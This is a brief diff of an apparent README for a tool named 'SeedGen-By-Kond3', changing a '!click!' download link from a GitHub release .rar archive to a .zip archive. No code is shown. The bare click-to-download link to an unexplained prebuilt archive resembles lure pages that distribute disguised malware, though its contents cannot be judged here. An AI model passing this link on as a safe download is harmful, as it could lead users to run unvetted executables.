@@ -1,4 +1,4 @@
-# Download - [!click!](https://github.com/kond3ve1/SeedGen-By-Kond3/releases/download/1/Release.rar)
+# Download - [!click!](https://github.com/kond3ve1/SeedGen-By-Kond3/releases/download/1/Release.zip)
 
 
 # ***Key features***
